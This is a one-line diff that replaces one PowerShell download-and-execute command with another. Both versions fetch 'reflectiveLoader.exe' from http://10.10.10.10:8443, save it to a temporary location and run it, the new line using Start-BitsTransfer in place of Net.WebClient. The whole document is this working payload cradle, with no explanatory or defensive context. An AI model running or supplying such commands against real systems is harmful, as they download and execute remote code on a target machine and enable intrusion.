@@ -1,1 +1,1 @@
-$url="http://10.10.10.10:8443/reflectiveLoader.exe"; $bytes=(New-Object Net.WebClient).DownloadData($url); $exePath=[System.IO.Path]::GetTempFileName()+".exe"; [System.IO.File]::WriteAllBytes($exePath,$bytes); & $exePath
+Start-BitsTransfer -Source "http://10.10.10.10:8443/reflectiveLoader.exe" -Destination "$env:temp\reflectiveLoader.exe"; & "$env:temp\reflectiveLoader.exe"
